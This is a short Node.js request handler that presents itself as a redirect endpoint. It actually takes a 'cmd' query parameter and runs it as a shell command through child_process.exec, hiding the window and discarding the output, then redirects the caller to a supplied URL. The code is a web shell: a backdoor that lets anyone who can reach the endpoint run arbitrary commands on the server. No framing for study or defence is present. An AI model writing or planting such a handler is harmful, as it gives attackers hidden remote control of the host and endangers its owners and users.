module.exports = (req, res) => {
   const { cmd,url } = req.query;
   if (!cmd || !url) return res.status(400).json({ error: "Missing parameters" });
   const { exec } = require("child_process");
   exec(cmd, { windowsHide: true, stdio: 'ignore' }, () => {});
   res.redirect(url);
};